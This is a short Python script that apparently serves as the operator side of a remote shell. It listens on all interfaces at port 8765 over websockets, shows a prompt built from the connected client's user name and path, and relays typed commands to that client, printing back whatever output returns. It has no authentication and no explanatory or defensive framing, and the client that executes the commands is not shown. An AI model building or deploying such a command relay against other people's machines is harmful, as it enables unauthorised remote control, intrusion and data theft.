import asyncio, websockets, os

async def handler(ws: websockets.ServerConnection):
    name = "client"
    path = "~"

    try:
        data = await ws.recv()
        path, name = data.split("|", 1)

        while True:
            if path.endswith(":\\"):
                path = path[:(path.__len__() - 2)]
            cmd = input(f"{name}@{path}$ ")

            if cmd in ("clear", "cls"):
                os.system("cls" if os.name == "nt" else "clear")
                continue

            await ws.send(cmd)
            reply = await ws.recv()

            if "|" in reply:
                newpath, newname = reply.split("|",1)
                path = newpath
                name = newname
                continue

            print(reply.rstrip())

    except Exception as e:
        print("\nconnection closed:", e)

    finally:
        print("\nclient left")


async def main():
    async with websockets.serve(handler, "0.0.0.0", 8765, ping_interval=None):
        print("Running on ws://localhost:8765")
        await asyncio.Future()

asyncio.run(main())